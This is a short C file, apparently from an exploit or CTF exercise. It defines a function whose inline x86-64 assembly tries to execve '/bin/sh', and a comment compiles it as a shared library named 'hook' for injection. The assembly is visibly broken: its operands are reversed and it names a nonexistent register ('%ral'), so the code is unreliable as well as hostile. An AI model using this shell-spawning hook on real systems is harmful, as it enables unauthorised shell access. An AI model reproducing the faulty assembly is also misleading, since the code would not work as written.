void diy(char *a){
	asm(
		"mov %rdi,0x68732f6e69622f\n"
		"push %rdi\n"
		"mov %rdi,%rsp\n"
		"xor %rsi,%rsi\n"
		"xor %rdx,%rdx\n"
		"mov %ral,0x3b\n"
		"syscall\n"
		);
}

//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook

